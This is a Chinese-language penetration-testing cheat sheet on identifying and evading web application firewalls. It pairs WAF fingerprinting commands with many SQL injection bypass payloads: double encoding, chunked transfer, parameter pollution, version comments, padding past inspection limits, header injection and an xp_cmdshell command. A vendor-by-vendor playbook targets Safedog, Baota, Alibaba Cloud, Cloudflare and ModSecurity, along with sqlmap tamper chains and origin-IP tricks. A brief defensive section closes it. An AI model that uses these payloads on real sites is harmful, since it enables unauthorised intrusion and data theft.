# WAF 识别与绕过（WAF Fingerprint & Bypass）

## 一句话理解
WAF 在"解析 HTTP"和"理解业务"之间存在缝隙：它必须先解析请求才能匹配规则，但它的解析器与后端未必一致、规则也未必覆盖所有编码/位置/方言。攻击者利用解析差异、协议特性、规则盲区，让恶意请求以"合法形态"抵达后端。

## 基础理解
- WAF 本质是"中间人"：请求先过 WAF 再到后端，两者对同一请求的**理解不一致**即存在绕过空间
- 绕过的根源是三个"不一致"：**编码理解不一致**（WAF 解一层、后端解两层）、**解析方式不一致**（分块/边界/递归深度处理不同）、**规则覆盖不一致**（检测长度上限、检测位置、数据库方言盲区）
- 攻击节奏：先识别 WAF 类型与规则粒度 → 按"普适 → 具体"顺序试绕过；防御节奏：消除不一致（规范化后再检测、与后端共用解析逻辑）

## WAF 识别
### 1. 拦截页特征（发探针看返回）
| WAF | 拦截页文字特征 |
| --- | --- |
| 安全狗 | 标题"网站防火墙"，正文"您的请求带有不合法参数，已被管理员设置拦截"，底部带安全狗 logo 与 safedog.cn 链接 |
| D盾 | IIS 场景常见，拦截页含"被 D 盾_防火墙 拦截"字样，或直接裸 404/500（看日志才见拦截记录） |
| 宝塔 | 正文"您的请求带有不合法参数，谢谢合作"或带"宝塔网站防火墙"标识，状态码常 403/404 |
| 阿里云盾 | 统一错误页"您的请求被阿里云 WAF 拦截"，或返回 405；页面带 aliyun 标识与 requestId |
| 雷池 SafeLine | "检测到危险请求，已被雷池 WAF 拦截"，附攻击类型/风险等级/事件编号 |
| Cloudflare | "Attention Required! \| Cloudflare"、"Sorry, you have been blocked"，附 Ray ID |
| F5 BIG-IP | "The requested URL was rejected. Please consult with your administrator." |
| Imperva | "Request unsuccessful. Incapsula incident ID: xxx" |

### 2. 指纹工具
```
wafw00f http://target.com                       # 主动探测，可识别 200+ 种 WAF
wafw00f -a http://target.com                    # 全量模式，跑完所有规则再下结论
sqlmap -u "http://target/?id=1" --identify-waf  # 注入前顺手识别
nmap -p80,443 --script http-waf-detect,http-waf-fingerprint target.com
# Burp 装 Wappalyzer 插件，被动识别每个响应的技术栈指纹
```

### 3. 响应头特征
- `X-WAF: xxx` / `X-WAF-Event-ID`：自研 WAF 常见
- `Server: Safe3`（Safe3 WAF）、`Server: yunsuo`（云锁）
- `CF-RAY` / `cf-mitigated: block` / `Server: cloudflare`（Cloudflare）
- `Server: stgw` / `x-upstream`（腾讯云）；`Server: Tengine`（阿里系常见）
- `Set-Cookie: __jsluid=`（知道创宇加速乐）；`TS*` 开头 cookie（F5）
- `Server: Mod_Security` 或 body 出现 "ModSecurity: Access denied"（ModSecurity 老版本）

### 4. 常见 WAF 分类
| 类别 | 代表产品 | 特点 |
| --- | --- | --- |
| 硬件 | F5 BIG-IP ASM、Imperva、绿盟、启明星辰 | 串接在链路上，解析规范化强，绕过难 |
| 软件 | 安全狗、D盾、云锁、宝塔 WAF | 部署在主机层，规则更新滞后 |
| 云 | 阿里云盾、腾讯云 WAF、Cloudflare、雷池 SafeLine | 规则更新快，厂商持续运营 |
| 开源 | ModSecurity（OWASP CRS）、Coraza、naxsi | 效果取决于配置与 CRS 等级 |

## 通用绕过思路
### 1. 编码与解码差异
```
# 双重 URL 编码：WAF 解一层看到 %20（无害），后端再解一层得到空格
?id=1%2520union%2520select%25201,2,3

# JSON Unicode 转义：WAF 字面匹配 \u0020 失配，JSON 解析器还原成空格
{"q":"1\u0020union\u0020select\u00201,2,3"}

# MySQL 十六进制编码：绕开引号与关键字字面匹配
?id=1 union select 0x73656c656374

# 宽字节注入（GBK 站点）：0xdf 吃掉转义反斜杠，引号逃逸
?id=1%df' and 1=1-- -
```

### 2. 分块传输（Chunked）
```
POST /news.php?id=1 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

3
sel
3
ect
0

```
- WAF 若不重组 chunked body，规则在原始字节流上失配；后端按 RFC 重组后得到 `select`
- Burp 装 "Chunked coding" 插件一键分块；分块粒度调小（1-2 字节）成功率更高

### 3. 协议层
```
# HTTP/2：二进制帧 + HPACK 头部压缩，多数 WAF 只按 HTTP/1.1 文本匹配（Burp 直接切协议）

# HPP：WAF 取第一个无害值，PHP 后端取最后一个（手法详见 ../exp/EXP-HPP.md）
?q=safe&q=1 union select 1,2,3

# multipart 里套文本：payload 藏在普通表单 part 的值里
------x
Content-Disposition: form-data; name="id"

1 union select 1,2,3
------x--

# Content-Type 混淆：声明 text/plain 实发 JSON，WAF 不按 JSON 树解析
Content-Type: text/plain

{"a":"1 union select 1,2,3"}
```

### 4. 语义盲区
```
# MySQL 版本内联注释：后端执行注释内语句，WAF 正则不拼接注释
1 /*!12345union*/ /*!12345select*/ 1,2,3

# 大小写混合：规则区分大小写时直接过
1 UniOn SeLeCt 1,2,3

# 超长参数填充：1MB 垃圾把 payload 推出 WAF 检测窗口
?a=AAAA...(1MB)...&id=1 union select 1,2,3
```

### 5. 特性绕过
```
# JSON 数组多层嵌套：WAF 只递归一层，深层漏检
{"a":[[[["1 union select 1,2,3"]]]]}

# XML 实体拼接：WAF 看到的是实体引用，后端解析器展开成 payload
<!DOCTYPE r [<!ENTITY p "union select">]><q>&p; 1,2,3</q>

# 换行插入：MySQL 把 \n 当空白符，关键字跨行导致 WAF 失配
?id=1%0aunion%0aselect%0a1,2,3
```

### 6. 资源限制
```
# WAF 通常只检测 body 前 8KB/16KB：垃圾数据垫前，payload 藏在阈值之后
POST /search
q=AAAA...(超过16KB的垃圾)...AA&inj=1 union select 1,2,3

# 超大文件上传：合法图片头 + 几十 MB 数据 + 尾部夹带 webshell，超出检测上限
```

### 7. 位置与频率
```
# header 注入：XFF/Referer/Cookie 常不在规则覆盖范围
X-Forwarded-For: 1' and extractvalue(1,concat(0x7e,user()))-- -
Referer: 1 union select 1,2,3
```
- 慢速攻击（slowloris）：慢速发 header/慢速分块，耗尽 WAF 连接池后，部分请求直接放行不检

### 8. 数据库方言
```
# 注释符替换：MySQL 的 # 换成 MSSQL 也兼容的 -- -
1 union select 1 -- -

# || 替代 or：MySQL/PG 中等效
1 || 1=1

# MSSQL exec 拆分 + 注释切割关键字
1;e/**/xec xp_cmdshell 'whoami'
```

## 典型 WAF 打法对照
### 安全狗（软件层，规则较死）
```
# %0a 换行切割关键字
?id=1%0aunion%0aselect%0a1,2,3
# 超长填充 + 分块组合
POST body: pad=AAAA...(64KB)...&q=1 union select 1,2,3   # 配合 chunked 发送
```

### 宝塔（默认规则较松）
```
# 默认规则下 sqlmap tamper 即可
sqlmap -u "http://target/?id=1" --tamper=space2comment --random-agent
# 生成效果：1/*!union*//*!select*/1,2,3
```

### 阿里云盾（云 WAF，规范化强、规则更新快）
```
# 单点绕过短命（规则更新快），与其找版本不如组合变形：分块 + HPP + 编码
POST body(chunked): q=safe&q=1%2520union%2520/**/select%25201,2,3   # PHP 取尾
# 打不动时找源站 IP 直连——绕的是部署架构而非规则（配合域名历史解析/全网扫描）
```

### Cloudflare（SQLi 规则极严）
```
# JSON 深层嵌套 + Unicode 转义
{"a":[[[["1\u0020union\u0020select\u00201,2,3"]]]]}
# 超长 URL：垃圾参数把注入点顶出匹配窗口
/?pad=AAAA...(8KB)...&id=1 union select 1,2,3
# 浏览器端构造（同源 fetch/XSS 触发）继承真实 cookie 与 TLS 指纹；
# 无 JS 环境的脚本直连反而易触发人机验证，必要时用无头浏览器过 JS 挑战
```

### ModSecurity（OWASP CRS）
```
# paranoia level 1 大多可过：版本注释 + 大小写
1 /*!12345UniOn*/ /*!12345SeLeCt*/ 1,2,3
# 942100 系列是 SQLi 规则集；从报错/日志/响应特征判断 CRS 版本，按版本查公开 bypass
# PL 越高（2/3/4）越难：多层变形叠加仍可能被 anomaly 评分累积拦截
```

## 实战排查思路
1. **先识别 WAF**：wafw00f / 拦截页 / 响应头，确定厂商与部署位置（云/软件/硬件），云 WAF 额外找源站直连的可能
2. **无害探针分级**，定位拦截粒度：
```
union select 1,2,3   # 完整 payload：确认拦不拦
union select         # 去掉数字：规则是否要求完整形态
union                # 单关键字：粒度到词还是到组合
selec                # 半个关键字：是否误杀（过宽说明变形空间小）
```
3. **选绕过方向**：先普适（编码/分块/%0a/超长填充），再具体（数据库方言/解析特性）；一次只变一个变量，命中后组合叠加
4. **sqlmap 常用组合**：
```
sqlmap -u "http://target/?id=1" \
  --tamper=space2comment,between,randomcase,charencode \
  --random-agent --delay=1 --timeout=30
```
5. **打不动换入口**：header（XFF/Referer/Cookie）、JSON 深层嵌套、二次注入（注册时存 payload，资料页读出时触发——WAF 只盯入站请求，不盯存储后的出站）

## 防御要点
- **规则持续更新**：订阅厂商规则/升级 CRS，每次被绕过都回溯补规则，不留"已知绕过"
- **语义引擎（AI WAF）**：语法树级检测（如雷池语义分析）优于正则黑名单，大幅压缩变形绕过空间
- **限长同时限频**：body 超长直接拒绝（而非"超长不检测"），限制请求频率与并发，防慢速攻击与资源耗尽
- **解析与后端一致性**：WAF 与后端共用同一套参数解析/解码逻辑，或入站先"规范化"再检测，消除各取所需
- **蜜罐陷阱字段**：埋入业务永不使用的参数（`debug`、`admin_cmd`），一旦被填充即判定为扫描器，直接封 IP

## 速查清单
```
# 1. 指纹识别
wafw00f http://target.com

# 2. 探针分级
union select 1,2,3 / union select / union / selec

# 3. 普适绕过
%0a 换行 / %2520 双重编码 / /*!12345*/ 版本注释 / chunked 分块 / 1MB 超长填充

# 4. sqlmap 常用参数
--tamper=space2comment,between,randomcase,charencode --random-agent --delay=1 --timeout=30

# 5. 换位置
X-Forwarded-For / Referer / Cookie / JSON 深层嵌套 / multipart part 值 / text/plain 发 JSON

# 6. 换入口
二次注入（先存后取）/ 源站 IP 直连（绕云 WAF 部署）/ HTTP/2 与 HTTP/1.1 解析差异
```

## 参考
- [wafw00f GitHub](https://github.com/EnableSecurity/wafw00f)
- [sqlmap tamper 官方列表](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
- [PayloadsAllTheThings - WAF Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/WAF%20Bypass.md)
- [雷池 SafeLine 官网](https://waf.chaitin.com/)
- [OWASP Core Rule Set 文档](https://coreruleset.org/docs/)
- 参数污染手法详见 ../exp/EXP-HPP.md；注入 payload 构造详见 ../exp/EXP-SQLi-MySQL.md
